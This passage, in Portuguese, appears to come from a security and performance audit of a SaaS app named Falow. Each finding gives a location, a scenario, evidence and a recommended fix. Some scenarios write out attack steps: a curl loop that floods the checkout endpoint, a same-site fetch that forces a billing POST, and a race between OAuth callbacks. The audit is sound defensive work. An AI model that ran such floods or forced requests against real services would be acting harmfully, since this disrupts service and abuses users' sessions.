**Recomendação:** Ao migrar para zod 4.6.6+ (major, junto com o upgrade do Next), o problema some; `npm audit fix` para nanoid/qs/source-map-js. Enquanto isso, verificar `Array.isArray(raw.nodes) && raw.nodes.length <= MAX_NODES` (e o mesmo para `edges`, `media_refs`, `options`) antes de chamar `safeParse`, aplicar `.max()` cedo ou limitar o tamanho do JSON antes do parse, e reduzir o `bodySizeLimit` global (ver achado de configuração), movendo o upload de anexos para upload direto ao Supabase Storage com URL assinada.

### A0-037 [low] Convite com cortesia sem limite de taxa nem confirmação: admin comprometido pode disparar convites em massa para e-mails arbitrários
`src/app/admin/actions.ts:115` · security · ⚠️ não verificado

**O que é:** inviteWithCourtesyAction aceita qualquer e-mail sintaticamente válido, cria a conta no Auth e envia o e-mail de convite com remetente do app, sem janela de confirmação (o formulário envia direto) e sem limite por admin/hora no app. resendAccessAction também dispara recuperação de senha sem confirmação. O único freio é o rate limit de e-mail do Supabase Auth (a confirmar na configuração; o padrão é baixo com o SMTP interno e configurável com SMTP próprio).

**Como acontece:** Sessão de admin roubada (ver achado do MFA, A0-007) → script chama inviteWithCourtesyAction em loop com e-mails de terceiros → centenas de contas-fantasma com cortesia e e-mails de convite saindo do domínio do app (reputação de envio, denúncia de spam), além de registrar entradas no audit log em volume. Contas criadas não têm purge automático (não têm linha em subscriptions).

**Evidência:** actions.ts:86-117: parse do e-mail com `z.string().trim().toLowerCase().email()` e logo `targetUserId = await inviteUser(admin, email)`; invite-courtesy-form.tsx:23-40 submete sem confirmação; nenhuma contagem/limite em src/.

**Recomendação:** Confirmação explícita no formulário (window.confirm como no bloqueio), limite por admin (ex.: contar courtesy_invite/invite_resend do mesmo admin_id na última hora no admin_audit_log e recusar acima de N), e alerta ao dono (log/e-mail) quando o limite for atingido. Confirmar o rate limit de e-mails no painel Supabase.

### A0-038 [low] E-mail do convidado fica para sempre em admin_audit_log.details, mesmo depois do purge LGPD apagar o usuário
`src/app/admin/actions.ts:108` · security · ⚠️ não verificado

**O que é:** courtesy_invite grava `details.email` (e target_user_id sem FK, de propósito). O purge (src/lib/billing/purge.ts) apaga o usuário no Auth e conta com o cascade, mas admin_audit_log não tem FK nem é tocada: o e-mail da pessoa excluída permanece em texto claro indefinidamente. Para os demais eventos só o UUID fica (ok), mas o convite preserva dado pessoal direto.

**Como acontece:** Cliente convidado → cancela → 30 dias → purge apaga auth.users e tudo em cascata → `select details->>'email' from admin_audit_log` ainda devolve o e-mail; um pedido de exclusão LGPD (a página /exclusao-de-dados promete apagar) não é cumprido integralmente.

**Evidência:** actions.ts:108 `details: { email, status: "requested" }` e :126 `details: { email, invited, status }`; purge.ts:57-59 apaga uploads e `deleteUser` sem anonimizar o audit log.

**Recomendação:** No purge (e no fluxo manual de exclusão do runbook), anonimizar `details.email` das entradas com target_user_id do usuário apagado (ex.: substituir por hash ou 'removido'), ou guardar só um hash do e-mail na auditoria desde o início. Documentar o prazo de retenção do registro.

### A0-035 [low] Três round-trips ao GoTrue por navegação no /admin (middleware + layout + page chamam getUser)
`src/app/admin/layout.tsx:15` · optimization · ⚠️ não verificado

**O que é:** O middleware já valida a sessão com `supabase.auth.getUser()` (chamada de rede ao /auth/v1/user). Em seguida AdminLayout chama requireAdmin() (novo client, novo getUser) e cada page (page.tsx:45, clientes/page.tsx:58) chama requireAdmin() de novo. Layout e page renderizam em paralelo, então são 2 chamadas extras de rede por navegação, além das actions, que também chamam (correto nesse caso).

**Como acontece:** Cada clique em Clientes/Registro = 3 requisições ao Supabase Auth só para saber quem é o usuário, antes de qualquer dado útil; soma-se às ~51 chamadas do achado do N+1 (A0-013).

**Evidência:** layout.tsx:15 `await requireAdmin();` ; page.tsx:45 `await requireAdmin();` ; clientes/page.tsx:58 `await requireAdmin();` ; require-admin.ts:17 `await createClient().auth.getUser()` sem memoização.

**Recomendação:** Envolver requireAdmin (ou a leitura do usuário) em `cache()` do React para deduplicar dentro do mesmo render de servidor; manter a chamada explícita nas server actions, que rodam em requisição própria.

### A2-034 [low] Registro do /admin faz uma chamada à Admin API do Supabase Auth por id de usuário a cada render
`src/app/admin/page.tsx:57` · optimization · ⚠️ não verificado

**O que é:** Para cada uma das 50 entradas do log, `emailOf` chama `admin.auth.admin.getUserById` (cacheado só por id dentro do render): até 100 requisições HTTP ao GoTrue por abertura da página, a cada visita de admin, sem cache entre renders.

**Como acontece:** Custo real: a página fica proporcional ao número de ids distintos (dezenas de chamadas HTTP sequenciais/paralelas ao Auth), consome o rate limit da Admin API e expõe o painel a lentidão quando o log cresce.

**Evidência:** admin/page.tsx:63 `admin.auth.admin.getUserById(id)` dentro de `emailOf`, chamado em :115 para `admin_id` e `target_user_id` de cada entrada.

**Recomendação:** Gravar o e-mail (ou um snapshot) na própria `admin_audit_log` no momento da ação, ou resolver os ids em lote com uma única query a `auth.users` via RPC/view com service role.

### A3-031 [low] State do OAuth não é amarrado ao usuário logado: a conta é gravada para quem estiver logado no momento do callback
`src/app/api/auth/meta/route.ts:25` · security · ⚠️ não verificado

**O que é:** O `state` é um UUID aleatório guardado só no cookie, sem relação com o user_id que iniciou o fluxo. O callback valida apenas cookie === query e depois usa `supabase.auth.getUser()` do momento. Em navegador compartilhado (ou se a sessão mudar durante os até 10 minutos de vida do cookie), a conta do Instagram autorizada é vinculada ao usuário atual, não a quem clicou em 'Conectar'. O CSRF clássico (vincular o IG do atacante ao painel da vítima) está coberto porque o cookie é do navegador da vítima; o achado é de hardening.

**Como acontece:** Usuário A inicia o OAuth, sai sem completar; no mesmo navegador o usuário B faz login em até 10 min e completa o callback com o code de A → o @ de A fica ativo na conta de B, e B passa a ler as DMs de A até A perceber.

**Evidência:** route.ts:25-32 `const state = randomUUID(); cookies().set("meta_oauth_state", state, ...)`; callback/route.ts:38 `state !== expectedState` e só depois `getUser()` (linha 42-45) sem comparar com quem iniciou.

**Recomendação:** Incluir o user_id no state (ex.: `${uuid}.${hmac(user.id + uuid)}`) ou guardar no cookie `state:user_id` e recusar o callback se o usuário logado for outro. Opcional: restringir o `path` do cookie a /sistema/api/auth/meta.

### A2-028 [low] Rotas POST /api/billing/checkout e /api/billing/portal não verificam Origin/CSRF e o checkout é criado para visitante anônimo sem limite
`src/app/api/billing/checkout/route.ts:12` · security · ⚠️ não verificado

**O que é:** As duas rotas são Route Handlers (não Server Actions, então o Next não aplica a checagem de Origin) acionadas por `<form method=post>` (src/app/page.tsx:31, src/app/assinatura/page.tsx:127 e 136, src/modules/app-shell/components/sidebar-footer.tsx:69). Nenhuma lê `Origin`/`Sec-Fetch-Site` nem token anti-CSRF. Hoje o CSRF cross-site é mitigado só porque os cookies do Supabase são `SameSite=Lax` (não enviados em POST cross-site), o que é uma defesa única e indireta: qualquer origem same-site (a landing em falow.app.br/ é outro site/código, subdomínios) consegue disparar o POST com a sessão do cliente. Além disso `POST /api/billing/checkout` cria uma Checkout Session na Stripe para qualquer visitante anônimo (checkoutDecision devolve `{kind:"checkout"}` sem user) sem rate limit no código; o Stripe limita ~100 req/s por conta, compartilhado com os webhooks.

**Como acontece:** (a) Script em página same-site (ex.: landing na raiz falow.app.br ou um subdomínio) faz `fetch('/sistema/api/billing/portal', {method:'POST', credentials:'include'})`/form auto-submit: o cliente logado é levado ao portal Stripe sem querer. (b) Atacante anônimo roda `while true; curl -X POST https://falow.app.br/sistema/api/billing/checkout` criando milhares de Checkout Sessions: poluição do painel Stripe, consumo do rate limit da API Stripe (afetando os webhooks e o portal) e CPU do Worker. Rate limiting via WAF da Cloudflare é a confirmar na configuração.

**Evidência:** checkout/route.ts:12 `export async function POST()` sem ler `request`; portal/route.ts:10 idem; src/lib/billing/checkout.ts:14 `return { kind: "checkout" };` para `userId: null`; teste routes.test.ts "visitante: sessao nova sem customer nem customer_email" confirma o comportamento.

**Recomendação:** Nas duas rotas, rejeitar quando `Origin`/`Referer` não for `https://falow.app.br` (ou `Sec-Fetch-Site` for `cross-site`), ou converter para Server Actions (que já checam Origin). Para o checkout anônimo: adicionar rate limit (Cloudflare Rate Limiting Rule na rota ou Turnstile no formulário da landing) e considerar exigir cadastro antes de abrir o checkout.

### A3-036 [low] Comparações de segredo não constantes no cron e na verificação do webhook da Meta; verify.ts faz short-circuit por tamanho
`src/app/api/cron/purge/route.ts:14` · security · ⚠️ não verificado

**O que é:** Item 1 da checklist: cron/purge (linha 14) e cron/sequences (linha 30) comparam o Bearer com `!==`; o GET do webhook da Meta compara `hub.verify_token` com `===` (src/app/api/webhooks/meta/route.ts:19). verify.ts usa `timingSafeEqual` mas só após `received.length === expected.length` (linha 28); como o HMAC-SHA256 tem tamanho fixo de 32 bytes, o vazamento é apenas o tamanho conhecido, impacto prático nulo. Nas comparações com `!==`/`===` o vazamento de timing por caractere é teórico sob jitter de rede na borda, por isso severidade baixa.

**Como acontece:** Atacante mede tempos de resposta de milhares de requisições a /sistema/api/cron/purge com prefixos diferentes do segredo; na prática o ruído da borda inviabiliza, mas a Cloudflare lista a comparação direta de segredos como anti-padrão a corrigir.

**Evidência:** src/app/api/cron/purge/route.ts:14 `if (request.headers.get("authorization") !== `Bearer ${secret}`)`; src/app/api/cron/sequences/route.ts:30; src/app/api/webhooks/meta/route.ts:19 `params.get("hub.verify_token") === process.env.META_VERIFY_TOKEN`; src/lib/meta/verify.ts:27-29.

**Recomendação:** Criar um helper `secretEquals(a, b)` que faz SHA-256 de ambos e `crypto.subtle.timingSafeEqual` (ou `timingSafeEqual` de node:crypto sobre os digests) e usar nas três rotas; em verify.ts remover o teste de length (comparar sempre 32 bytes após hash). Combinar com o bloqueio de /api/cron/* no WAF (achado sobre o CRON_SECRET na query string).

### A1-033 [low] CRON_SECRET aceito na query string (vai para logs/URL) e comparado sem tempo constante; rota de cron exposta publicamente sem necessidade
`src/app/api/cron/sequences/route.ts:29` · security · ⚠️ não verificado

**O que é:** A rota aceita `?secret=<CRON_SECRET>` além do header Bearer. O único chamador real é o `scheduled()` do worker.ts, que envia o header e chama `handler.fetch` internamente, sem rede. A alternativa por query string coloca o segredo em URL: com `[observability] enabled = true` os invocation logs do Workers Logs guardam metadados da requisição (URL inclusa, a confirmar no painel), e ele também aparece em Logpush/analytics, histórico de navegador de quem testar à mão e em qualquer proxy. A comparação `auth !== \`Bearer ${secret}\`` é a igualdade de string do JS (não constant-time); risco prático remoto pela rede, mas é o padrão que a checklist da Cloudflare/OWASP recomenda evitar. A rota de purge já faz só por header (route.ts:14), então as duas estão inconsistentes.

**Como acontece:** Operador configura um agendador externo com `?secret=` (como o comentário da rota sugere) ou testa manualmente no navegador; o segredo fica em Workers Logs / Logpush / histórico. Quem lê os logs (outro membro da conta Cloudflare, integração de observabilidade) obtém o CRON_SECRET e passa a poder disparar `/sistema/api/cron/purge` (que apaga usuários/uploads) e o tick de sequências à vontade.

**Evidência:** src/app/api/cron/sequences/route.ts:29-31 `const bySecret = request.nextUrl.searchParams.get('secret'); if (auth !== \`Bearer ${secret}\` && bySecret !== secret) return 403`; src/app/api/cron/purge/route.ts:14 só header; worker.ts:31-33 chama `handler.fetch(request, env, ctx)` internamente; wrangler.toml:32-33 observability ligada.

**Recomendação:** Remover a aceitação por query string (deixar só o header, como no purge); comparar com `crypto.timingSafeEqual` sobre buffers de mesmo tamanho (nodejs_compat está ligado); e, como defesa em profundidade da checklist Cloudflare, criar uma regra de WAF/Firewall bloqueando `falow.app.br/sistema/api/cron/*` vindo da internet, já que o scheduled() não passa pela rede. Exigir CRON_SECRET com entropia mínima (ex.: 32 bytes aleatórios).

### A2-026 [low] Webhook da Meta lê o corpo inteiro antes de validar a assinatura, sem teto de tamanho
`src/app/api/webhooks/meta/route.ts:29` · webhook · ⚠️ não verificado

**O que é:** `await request.text()` consome qualquer corpo (limite da plataforma: 100 MB no plano pago) e só então calcula o HMAC-SHA256 em verify.ts. Um corpo gigante custa CPU/memória e tempo de invocação antes da rejeição com 401. A verificação em si está correta (timingSafeEqual com checagem de tamanho, aceita INSTAGRAM_APP_SECRET ou META_APP_SECRET).

**Como acontece:** Atacante anônimo faz POSTs de dezenas de MB em /sistema/api/webhooks/meta em paralelo; cada um ocupa uma invocação do Worker calculando HMAC sobre lixo. Não compromete dados, só disponibilidade/custo.

**Evidência:** route.ts:29 `const rawBody = await request.text();` seguido de verifyMetaSignature em route.ts:32

**Recomendação:** Rejeitar cedo quando `content-length` passar de ~1 MB (payloads reais da Meta têm alguns KB) e quando faltar o header x-hub-signature-256, antes de ler o corpo. Reforçar com uma regra de Rate Limiting da Cloudflare na rota do webhook por IP (os IPs da Meta são publicados).

### A2-036 [low] Login, redefinição de senha e checkout anônimo sem rate limiting na aplicação
`src/app/login/actions.ts:37` · config · ⚠️ não verificado

**O que é:** `signIn` (linha 18) e `requestPasswordReset` (37) são server actions públicas sem throttling próprio; a mesma coisa para `POST /api/billing/checkout`. A proteção depende dos rate limits padrão do Supabase Auth (sign-in por IP e e-mails por hora) e de regras no WAF da Cloudflare, nenhum dos dois verificável no repo (a confirmar na configuração). O cron, o webhook e o painel rodam no mesmo Worker, então uma rajada contra o login consome CPU time que atrasa o processamento de DMs.

**Como acontece:** Atacante anônimo faz credential stuffing contra `signIn` (resposta genérica, mas sem bloqueio no app) ou dispara `requestPasswordReset` para a lista de e-mails de clientes, gerando spam de e-mails de recuperação em nome do Falow até o limite do Supabase.

**Evidência:** login/actions.ts:28 `await supabase.auth.signInWithPassword(parsed.data)` e :42 `await createClient().auth.resetPasswordForEmail(email.data, ...)` sem contador/limite; nenhuma regra de rate limit no repo (wrangler.toml não configura WAF).

**Recomendação:** Criar Rate Limiting Rules na Cloudflare para `POST falow.app.br/sistema/login` e `/sistema/api/billing/checkout` (ex.: 10/min por IP), ligar Bot Fight Mode/Turnstile no login e conferir no painel do Supabase Auth os limites de sign-in e de envio de e-mail; opcionalmente registrar tentativas por e-mail/IP em KV/D1 e bloquear após N falhas.

### A0-036 [low] Bloquear não cancela nem pausa a assinatura na Stripe: cliente bloqueado continua sendo cobrado
`src/components/admin/customer-actions.tsx:181` · reliability · ⚠️ não verificado

**O que é:** blockUser só grava access_grants; a única salvaguarda é um texto no diálogo ('Se o cliente paga, cancele também na Stripe.'). Não há chamada à API da Stripe, nem link para o customer (a tabela tem stripe_customer_id), nem alerta persistente na lista de clientes bloqueados com status active/trialing/past_due. O runbook assume a etapa manual.

**Como acontece:** Admin bloqueia cliente pagante e esquece a Stripe → o cliente perde o acesso na hora, mas a renovação mensal continua sendo cobrada → reclamação/chargeback (que a Stripe penaliza) e obrigação de reembolso. O estado 'bloqueado + active' é silencioso na UI após fechar o diálogo.

**Evidência:** customer-actions.tsx:180-183: `<p>Se o cliente paga, cancele também na Stripe.{hasSubscription ? " Este cliente tem assinatura." : ""}</p>`; grants.ts:132-146 (blockUser) não toca a Stripe. docs/operacao-saas.md:974 'bloquear não cancela a cobrança'.

**Recomendação:** Na ação de bloqueio de cliente com assinatura ativa, cancelar (ou pausar a cobrança) via API da Stripe usando stripe_subscription_id já conhecido, registrando no details da auditoria; no mínimo, mostrar na lista um badge persistente 'Bloqueado e ainda cobrando' com link direto para o customer na Stripe.

### A0-039 [low] Trava de auditoria das server actions depende da string literal 'createAdminClient' e de 'export async function': escapa por indireção
`src/lib/auth/__tests__/admin-actions.audit.test.ts:74` · reliability · ⚠️ não verificado

**O que é:** O teste só inspeciona arquivos 'use server' cujo texto contém literalmente `createAdminClient`. Um helper que cria o client por parâmetro default — padrão que já existe em src/lib/expiry/sweep.ts:62 (`admin: AdminClient = createAdminClient()`) — importado por um arquivo 'use server' sem a literal não entra no manifesto, e a checagem de 'só exporta async function' também não roda nele (`export const f = async () =>` passaria). A trava do /admin (FIRST_STATEMENT) só olha `export async function`. Hoje nenhuma action escapa (conferido: lib/expiry/actions.ts usa só o client do usuário), mas a garantia é frágil para código futuro.

**Como acontece:** Dev cria `src/app/(dashboard)/x/actions.ts` ('use server') que importa `sweepExpired()` de sweep.ts (service role por default param) ou exporta `export const apagar = async (id) => ...` usando um helper com service role → teste continua verde, action sem checagem de posse vai para produção.

**Evidência:** admin-actions.audit.test.ts:74 `if (!/^["']use server["']/m.test(text) || !text.includes("createAdminClient")) continue;` ; :76 `for (const m of text.matchAll(/export async function (\w+)/g))` ; sweep.ts:62 `admin: AdminClient = createAdminClient(),`

**Recomendação:** Fazer a varredura seguir imports (ou considerar 'use server' que importa qualquer módulo de uma lista de módulos com service role), proibir `createAdminClient()` como parâmetro default (lint/teste), e aplicar a regra 'só export async function' a TODOS os arquivos 'use server', não só aos que contêm a literal.

### A3-029 [low] Purge só alcança assinaturas 'canceled': tokens e dados de clientes bloqueados, com cortesia vencida ou sem assinatura ficam para sempre
`src/lib/billing/purge.ts:27` · reliability · ⚠️ não verificado

**O que é:** A exclusão LGPD seleciona apenas `subscriptions.status = canceled` com purge_after vencido. Usuários que conectaram o Instagram via cortesia (access_grants) e tiveram a cortesia vencida ou revogada, usuários bloqueados pelo admin, e usuários cuja assinatura ficou em incomplete/unpaid/paused nunca entram no laço: suas linhas em ig_accounts (com access_token_enc cifrado e ainda válido na Meta), conversas, mensagens e uploads do bucket crm-uploads ficam indefinidamente. Isso também mantém o @ 'preso' (ver achado do account_taken).

**Como acontece:** Admin concede cortesia de 30 dias a um lead, ele conecta @X, importa o histórico de DMs, a cortesia vence e ele nunca assina → token e todas as DMs dos leads dele ficam no banco e no Storage sem prazo, e @X não pode ser conectado por outro cliente.

**Evidência:** purge.ts:27-32 `.eq("status", "canceled").neq("user_id", owner).lt("purge_after", ...)`; nenhuma varredura de access_grants vencidos ou de usuários sem linha em subscriptions.

**Recomendação:** Estender o purge (ou criar um segundo passo) para usuários sem acesso há mais de N dias independentemente da origem (cortesia vencida, bloqueio antigo, sem assinatura), usando o mesmo hasActiveAccess como guarda, e, como mínimo, limpar access_token_enc dessas contas.

### A1-038 [low] URL do cron depende de NEXT_PUBLIC_APP_URL conter '/sistema'; README documenta o valor sem o basePath (cron vira 404 silencioso)
`src/lib/cron/schedule.ts:26` · config · ⚠️ não verificado

**O que é:** cronRequestFor monta `${env.NEXT_PUBLIC_APP_URL ?? 'https://falow.app.br/sistema'}${path}`. Se a var do Worker for definida como `https://falow.app.br` (é o que README.md:79 e docs/superpowers/specs/2026-10-15-falow-multiusuario-design.md:186 recomendam; só docs/operacao-saas.md:478 diz '/sistema'), a requisição interna vai para `/api/cron/sequences` sem o basePath e o Next responde 404: nenhum atraso é retomado pelo cron e nenhum usuário vencido é purgado, restando apenas o tick oportunista do webhook. O único sinal é um `console.error('[cron] ... -> 404')` no Workers Logs. A confirmar o valor da var no painel do Cloudflare.

**Como acontece:** Deploy novo seguindo o README: `NEXT_PUBLIC_APP_URL=https://falow.app.br` no Worker → cron 404 a cada minuto → delays só rodam quando chega algum webhook (3 por vez) → backlog cresce e workflows com atraso param de funcionar sem alerta.

**Evidência:** src/lib/cron/schedule.ts:12 `DEFAULT_APP_URL = 'https://falow.app.br/sistema'`; :26-27 `const base = (env.NEXT_PUBLIC_APP_URL ?? DEFAULT_APP_URL).replace(/\/+$/, ''); return new Request(\`${base}${path}\`, ...)`; README.md:79 `https://falow.app.br em produção`; worker.ts:34-36 só loga `!res.ok`.

**Recomendação:** Não derivar a URL interna do cron de uma var pública: usar um host fixo + basePath lido do next.config (ou validar que a base termina em '/sistema' e logar erro claro), e alinhar README/.env.example com operacao-saas.md. Adicionar alerta (Workers Logs → notificação) para respostas não-2xx do cron.

### A2-020 [low] AES-256-GCM sem AAD e com a mesma chave para tokens do Instagram e chaves de IA: cifrados são intercambiáveis entre linhas e tabelas
`src/lib/crypto.ts:22` · security · ⚠️ não verificado

**O que é:** `createCipheriv(ALGO, getKey(), iv)` não usa `setAAD`. O cifrado não fica amarrado ao contexto (tabela, user_id, ig_user_id), e a mesma chave cifra `ig_accounts.access_token_enc` e `user_ai_settings.api_key_enc`. Um cifrado copiado de uma linha para outra decifra normalmente. IV aleatório de 12 bytes e chave hex de 64 chars estão corretos; o problema é só a falta de binding.

**Como acontece:** Quem conseguir escrever no banco sem conseguir ler a chave (ex.: service role vazada, SQL injection futura em outra parte, admin do Supabase mal-intencionado) copia o access_token_enc da conta de um cliente para a linha de um @ sob seu controle, ou troca uma api_key_enc de IA por um token do Instagram, e o app passa a usar o segredo da vítima em nome de outro tenant sem nenhum erro de autenticação. Exige acesso de escrita ao banco, por isso severidade baixa.

**Evidência:** crypto.ts:22 `const cipher = createCipheriv(ALGO, getKey(), iv);` sem setAAD; ai-settings/actions.ts:84 e callback/route.ts:103 usam o mesmo encryptToken

**Recomendação:** Passar AAD com o contexto (`${tabela}:${user_id}` ou o id da linha) em encrypt/decrypt, e derivar subchaves por finalidade (HKDF da TOKEN_ENCRYPTION_KEY com info 'ig-token' / 'ai-key'). Fazer junto com o versionamento de chave do achado sobre rotação da TOKEN_ENCRYPTION_KEY, já que ambos mudam o formato do payload.

### A3-019 [low] Recheck de 3 s do portão roda inline no webhook, inclusive quando a pessoa só repetiu a palavra-chave
`src/lib/follow-gate/check.ts:32` · optimization · ⚠️ não verificado

**O que é:** Com recheck=true, checkFollow dorme FOLLOW_RECHECK_DELAY_MS (3 s) e consulta a Meta de novo. No caminho de DM, applyRule passa `again: heldByGate` (process.ts:484-486): basta o conteúdo estar retido para qualquer nova DM com a palavra-chave pagar o delay humanizado (2-5 s) + 3 s + 2 chamadas à Graph API, mesmo que a pessoa nunca tenha tocado em "Já segui" nem seguido. Tudo isso segura a resposta HTTP do webhook (route.ts:45 aguarda o processamento) e consome o orçamento de 40 s da invocação, que é compartilhado por todos os eventos do lote da Meta. No caminho de postback, getFreshToken é chamado duas vezes (ver achado específico sobre a renovação dupla do token).

**Como acontece:** Pessoa que não segue manda "oi" 3 vezes: cada evento custa até 8 s de sleep + 3 GETs + 1 envio; num lote com vários eventos a invocação passa do orçamento e o tick de sequências (processDueRunsSafe) fica sem tempo; a Meta pode reentregar o lote por timeout (dedupe por mid evita duplicata, mas o custo se repete).

**Evidência:** check.ts:17 `FOLLOW_RECHECK_DELAY_MS = 3_000`; check.ts:31-35 `if (!recheck) return ...; await sleep(FOLLOW_RECHECK_DELAY_MS);` ; process.ts:484-486 `holdUnlessFollowing(..., { again: heldByGate })`.

**Recomendação:** Fazer o recheck só no postback "Já segui" (onde a pessoa acabou de agir) e não na repetição da palavra-chave; reduzir o delay ou substituí-lo por uma única consulta; reaproveitar o token obtido no postback; considerar mover o processamento pesado do webhook para `ctx.waitUntil`/fila após responder 200.

### A3-018 [low] Cada envio do portão faz uma chamada extra à Graph API (syncAccountProfile) dentro do webhook
`src/lib/follow-gate/gate.ts:92` · optimization · ⚠️ não verificado

**O que é:** sendFollowGateMessage chama syncAccountProfile a cada portão enviado só para montar o link do perfil: isso é 1 GET /me (getInstagramProfile) por mensagem de portão, mais um UPDATE em ig_accounts se algo mudou, tudo no caminho síncrono do webhook (a rota aguarda processWebhookPayload antes de responder 200). O @ já está em account.ig_username e muda raramente.

**Como acontece:** Conta com portão ligado e volume alto: cada DM/comentário de não seguidor = consulta is_user_follow_business + GET /me + envio do template; a chamada extra consome cota da Graph API por conta e soma latência ao webhook (e, se o perfil falhar, cai no @ salvo de qualquer forma).

**Evidência:** gate.ts:92 `const { ig_username } = await syncAccountProfile(admin, account, token);` chamado incondicionalmente em sendFollowGateMessage.

**Recomendação:** Usar account.ig_username diretamente e sincronizar o perfil fora do webhook (na tela Contas, que já usa withSyncedProfiles, ou no cron de purge/sequences com TTL de horas), ou cachear o resultado por conta por alguns minutos.

### A2-025 [low] withSyncedProfiles faz 1 requisição à Graph API por conta ativa a cada render de /accounts e do editor de workflow, sem cache
`src/lib/meta/account-profile.ts:57` · optimization · ⚠️ não verificado

**O que é:** `withSyncedProfiles` decifra o token e chama `getInstagramProfile` (GET graph.instagram.com/me, 1 requisição HTTPS à Meta por conta ativa) toda vez que /accounts (accounts/page.tsx:45), /rules/sequencias/nova (nova/page.tsx:36) e /rules/sequencias/[id] ([id]/page.tsx:63) são renderizadas (page.tsx chama em todo request, `dynamic`), sem cache nem carimbo de última sincronização. A render fica bloqueada pela latência da Meta (timeout de até 15s por conta em igFetch) e consome cota de chamadas da conta do cliente, só para detectar troca de @ ou foto, que é rara. O achado sobre o editor de workflow cobre o impacto combinado com o carregamento de grafos/versões.

**Como acontece:** Cliente com 1 conta: cada abertura do editor de workflow espera a Meta responder antes de pintar a tela (+200-800 ms típicos; se a Meta estiver lenta, até 15s). Dono/admin com várias contas: N chamadas em paralelo por abertura. Em pico, as chamadas de perfil competem com o envio de DMs no mesmo limite de taxa do app/token (risco de rate limit da Meta afetar o envio de mensagens).

**Evidência:** account-profile.ts:61-72 `Promise.all(accounts.map(async ... syncAccountProfile(db, account, token)))` sem verificação de idade; sequencias/nova/page.tsx:36, [id]/page.tsx:63 `const accounts = await withSyncedProfiles(createAdminClient(), storedAccounts ?? []);` e accounts/page.tsx:45 chamam a cada render

**Recomendação:** Guardar `profile_synced_at` em ig_accounts e só re-sincronizar se passou mais de X horas (ou fazê-lo no cron diário/purge), devolvendo os valores do banco na render, mantendo um botão "Atualizar" manual na tela Contas. Alternativa: sincronizar em background com `after()`/waitUntil sem bloquear a resposta.

### A3-026 [low] Limite de 1 conta por cliente só é checado em memória: dois callbacks simultâneos conectam duas contas
`src/lib/meta/connect-guard.ts:17` · bug · ⚠️ não verificado

**O que é:** A regra MAX_ACCOUNTS_PER_USER = 1 é aplicada só pelo connectBlockReason, com base numa leitura prévia de ig_accounts; não há constraint no banco limitando contas ativas por user_id (o índice único da 0020 é por ig_user_id). Dois callbacks concorrentes do mesmo usuário com dois `code` de contas diferentes passam ambos pela checagem (ambos veem zero contas) e os dois upserts entram, deixando o cliente com duas contas ativas no plano de uma.

**Como acontece:** O usuário abre a URL do diálogo OAuth (mesmo `state`) em duas sessões do Instagram diferentes, captura as duas URLs de callback (code1 e code2) sem deixá-las completar, e dispara as duas ao mesmo tempo a partir do navegador que tem o cookie meta_oauth_state e a sessão do Falow. Resultado: @X e @Y ativas para o mesmo user_id, ambas atendidas pelo webhook.

**Evidência:** connect-guard.ts:17-18: `others.length >= MAX_ACCOUNTS_PER_USER` sobre o array lido antes; callback/route.ts:95-111 upsert sem nenhuma condição de contagem; migrations 0001/0020 não têm índice/constraint por user_id.

**Recomendação:** Garantir o limite no banco (ex.: índice único parcial `on ig_accounts (user_id) where status = 'active'` para contas não-admin, ou um trigger que conta linhas active por usuário), e tratar o 23505 correspondente como `account_limit`. Alternativamente serializar o callback por usuário (advisory lock via RPC).

### A2-021 [low] Tokens de acesso vão na query string das chamadas à Graph API (em vez de Authorization: Bearer); sem appsecret_proof
`src/lib/meta/graph.ts:48` · security · ⚠️ não verificado

**O que é:** `graphPost` monta `${BASE}/${path}?access_token=...` e `graphGet` coloca `access_token` em URLSearchParams; oauth.ts faz o mesmo em getLongLivedToken (linha 94), refreshLongLivedToken (111) e getInstagramProfile (135). A Graph API aceita `Authorization: Bearer <token>`. Token na URL aparece em `res.url`, em erros que incluam a URL, em logs de proxies e, se um dia alguém logar a requisição para depurar, no Workers Logs. Também não há `appsecret_proof`; para graph.instagram.com (Instagram API with Instagram Login) o suporte a 'Require App Secret' é a confirmar na documentação/painel da Meta.

**Como acontece:** Um console.log de depuração da URL, uma mensagem de erro de rede que inclua a URL, ou acesso a logs intermediários expõe o token longo (60 dias) da conta do cliente, permitindo enviar DMs e ler conversas em nome dele até a expiração.

**Evidência:** graph.ts:48 `${BASE}/${path}?access_token=${encodeURIComponent(accessToken)}`; graph.ts:64 `new URLSearchParams({ ...params, access_token: accessToken })`

**Recomendação:** Enviar o token no header `Authorization: Bearer` em graphPost/graphGet e nas funções de oauth.ts (refresh e /me). Avaliar `appsecret_proof` (HMAC-SHA256 do token com o app secret) se a Meta o aceitar neste produto e ligar 'Require App Secret' no painel. Nunca interpolar `res.url` em mensagens de erro.

### A2-038 [low] Tick oportunista + sweep de expiração executam 6 consultas extras ao fim de todo webhook, mesmo sem nada a fazer
`src/lib/meta/process.ts:186` · optimization · ⚠️ não verificado

**O que é:** Ao fim de cada payload, `expireAutomationsSafe()` faz 4 escritas (delete+update em rules e sequences, sweep.ts:31-45) e `processDueRunsSafe` faz recoverStaleRuns + a busca de vencidos (2 selects com join de `sequences!inner(*)`, que traz o grafo inteiro). O cron já faz isso a cada minuto. São 6 round trips a mais por webhook (ou ~15–20% das consultas de uma DM simples) na maioria das vezes sem efeito.

**Como acontece:** 10.000 webhooks/dia → 60.000 consultas/dia só de manutenção redundante com o cron.

**Evidência:** process.ts:186-187: `await expireAutomationsSafe(); await processDueRunsSafe(3, invocationDeadline(invocationStart));`

**Recomendação:** Deixar expiração e retomada só no cron (já roda a cada minuto) ou executá-las no webhook apenas quando sobrar orçamento e em background (`waitUntil`), com uma consulta barata de existência (`limit 1`, sem o join do grafo) antes de buscar linhas completas.

### A2-022 [low] Renovação de token: expires_in ausente desliga a renovação para sempre; falha de renovação é retentada a cada evento; sem backoff/retry na Graph API
`src/lib/meta/token.ts:37` · reliability · ⚠️ não verificado

